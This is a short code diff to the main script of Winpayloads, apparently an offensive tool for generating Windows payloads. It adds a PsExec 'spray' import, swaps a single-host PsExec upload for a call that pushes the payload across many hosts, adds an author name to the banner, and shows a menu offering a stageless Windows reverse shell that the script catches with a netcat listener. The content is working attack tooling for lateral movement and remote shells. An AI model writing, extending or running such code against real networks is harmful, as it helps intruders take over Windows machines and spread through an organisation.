@@ -2,6 +2,7 @@
 from lib.main import *
 from lib.payloadextras import *
 from lib.startmetasploit import *
+from lib.psexecspray import *
 
 if not re.search('winpayloads', os.getcwd().lower()):
     print t.bold_red + "[!!] Please Run From Winpayloads Dir" + t.normal
@@ -29,7 +30,7 @@ print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(
 print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
 print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
 print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
-print "   /____/".center(t.width)
+print "   /____/Charlie Dean".center(t.width+11)
 print t.normal + '=' * t.width
 print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
        t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
@@ -218,7 +219,7 @@ try:
         FUNCTIONS().DoServe(want_to_payloadinexe,want_to_upload,IP,payloadinexe_payloadnameshort,payloadname,payloaddir)
 
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
-        FUNCTIONS().DoPsexec(payloaddir,payloadname)
+        DoPsexecSpray(payloaddir + '/' + payloadname)
 
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
